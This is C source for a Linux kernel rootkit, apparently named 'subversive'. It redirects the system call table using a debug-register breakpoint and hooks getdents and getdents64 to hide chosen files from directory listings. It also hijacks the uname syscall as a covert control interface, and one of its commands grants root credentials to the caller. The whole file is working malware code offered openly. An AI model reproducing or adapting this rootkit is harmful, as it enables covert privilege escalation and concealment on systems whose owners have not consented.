#include <linux/kernel.h>
#include <linux/cred.h>
#include <asm/ptrace.h>
#include <asm/unistd.h>

#include <subversive/config.h>
#include <subversive/arch.h>
#include <subversive/structs.h>
#include <subversive/dr_breakpoint.h>
#include <subversive/subversive_ctl.h>

#define SYSCALL(sys, args...) ((long(*)())sct[__NR_##sys])(args)
#define HOOK(sys, func) fake_sct[__NR_##sys] = (unsigned long)func

static unsigned long fake_sct[300];
static unsigned long *sct;

static int lulz_mode = 0;
/*
 * for the lulz
 */
asmlinkage long new_sys_write(unsigned int fd, char *buf, size_t count)
{
	int i;

	if (lulz_mode && (fd == 1 || fd == 2)) {
		for (i = 0; i < count; i++) {
			switch (buf[i]) {
			case 'a':
				buf[i] = '4';
				break;
			case 'e':
				buf[i] = '3';
				break;
			case 'i':
				buf[i] = '1';
				break;
			case 'o':
				buf[i] = '0';
				break;
			case 's':
				buf[i] = '5';
				break;
			}
		}
	}

	return SYSCALL(write, fd, buf, count);
}


static u64 hidden_inodes[MAX_HIDDEN_INODES];

static int is_inode_hidden(u64 ino)
{
	int i;

	for (i = 0; i < MAX_HIDDEN_INODES; i++)
		if (hidden_inodes[i] == ino)
			return 1;
	return 0;
}

static void hide_inode(u64 ino)
{
	int i;

	for (i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (!hidden_inodes[i] || hidden_inodes[i] == ino) {
			hidden_inodes[i] = ino;
			break;
		}
	}
}

static void unhide_inode(u64 ino)
{
	int i;

	for (i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (hidden_inodes[i] == ino) {
			hidden_inodes[i] = 0;
			break;
		}
	}
}

asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent *dirp, size_t count)
{
	int pos;
	long ret;

	ret = SYSCALL(getdents, fd, dirp, count);
	if (ret <= 0)
		return ret;

	for (pos = 0; pos < ret; ) {
		char *ptr = (char *)dirp + pos;
		struct linux_dirent *d = (struct linux_dirent *)ptr;

		if (is_inode_hidden(d->d_ino)) {
			memcpy(d, (char *)d + d->d_reclen, ret - pos - d->d_reclen);
			ret -= d->d_reclen;
		} else {
			pos += d->d_reclen;
		}
	}

	return ret;
}

asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, size_t count)
{
	int pos;
	long ret;

	ret = SYSCALL(getdents64, fd, dirp, count);
	if (ret <= 0)
		return ret;

	for (pos = 0; pos < ret; ) {
		char *ptr = (char *)dirp + pos;
		struct linux_dirent64 *d = (struct linux_dirent64 *)ptr;

		if (is_inode_hidden(d->d_ino)) {
			memcpy(d, (char *)d + d->d_reclen, ret - pos - d->d_reclen);
			ret -= d->d_reclen;
		} else {
			pos += d->d_reclen;
		}
	}

	return ret;
}

static inline void give_root_creds(void)
{
	commit_creds(prepare_kernel_cred(NULL));
}

/*
 * rookit interface
 */
asmlinkage long new_sys_newuname(struct new_utsname *name)
{
	struct rk_args *args = (struct rk_args *)name;

	switch (args->mode) {
	case HIDE_INODE:
		hide_inode(args->param1);
		break;
	case UNHIDE_INODE:
		unhide_inode(args->param1);
		break;
	case LULZ_MODE:
		lulz_mode = args->param1;
		break;
	case GET_ROOT:
		give_root_creds();
		break;
	}
	
	memset(name, 0, sizeof(*name));
	return SYSCALL(uname, name);
}

void system_call_hook(struct pt_regs *regs)
{
	/*
	 * call *sys_call_table(,%rax,8)
	 */
	unsigned long off = ((unsigned long)fake_sct - (unsigned long)sct);
	regs->ax += off / sizeof(unsigned long);
}

int hook_sys_call_table(void)
{
	memset(hidden_inodes, 0, ARRAY_SIZE(hidden_inodes));

	find_sys_call_table();
	sct = (unsigned long *)sys_call_table;
	if (!sct)
		return -1;

	memcpy(fake_sct, sct, sizeof(fake_sct));

	HOOK(uname, new_sys_newuname);
	HOOK(write, new_sys_write);
	HOOK(getdents, new_sys_getdents);
	HOOK(getdents64, new_sys_getdents64);

	register_dr_breakpoint(sys_call_table_call, BP_EXEC, system_call_hook);

	return 0;
}
